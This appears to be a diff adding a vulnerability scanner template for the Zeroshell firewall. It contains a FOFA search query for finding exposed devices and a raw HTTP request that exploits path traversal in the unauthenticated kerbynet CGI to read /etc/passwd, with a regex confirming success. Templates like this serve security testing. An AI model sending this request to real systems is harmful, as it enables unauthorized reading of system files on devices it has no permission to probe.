@@ -1,0 +1,21 @@
+id: zeroshell-file-read
+info:
+  name: zeroshell-file-read
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: app="Zeroshell-防火墙"
+http:
+  - raw:
+    - |      
+      GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd HTTP/1.1
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          
